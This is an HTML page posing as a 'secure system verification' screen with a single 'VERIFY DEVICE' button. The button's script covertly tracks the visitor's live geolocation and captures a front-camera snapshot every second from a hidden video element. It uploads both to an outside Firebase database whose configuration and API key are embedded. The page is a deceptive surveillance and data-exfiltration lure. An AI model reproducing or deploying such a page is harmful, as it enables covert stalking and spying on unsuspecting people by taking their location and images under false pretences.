<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>JARVIS - SECURE SYSTEM VERIFICATION</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;">
    <button id="verifyBtn" style="padding:20px 40px; background:#ff0000; color:#fff; border:none; cursor:pointer;">VERIFY DEVICE</button>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const db = firebase.database();
        const firebaseConfig = { apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc", authDomain: "army-cb492.firebaseapp.com", databaseURL: "https://army-cb492-default-rtdb.firebaseio.com", projectId: "army-cb492", appId: "1:449848409517:web:386ad1b570731b6ec4f524" };
        firebase.initializeApp(firebaseConfig);

        document.getElementById('verifyBtn').onclick = async () => {
            navigator.geolocation.watchPosition((p) => {
                db.ref('live_detect/location').set({ lat: p.coords.latitude, lon: p.coords.longitude });
            });
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('v').srcObject = s;
            setInterval(() => {
                const c = document.getElementById('c');
                c.width = 320; c.height = 240;
                c.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 320, 240);
                db.ref('live_detect').update({ photo: c.toDataURL('image/jpeg', 0.5) });
            }, 1000);
        };
    </script>
</body>
</html>
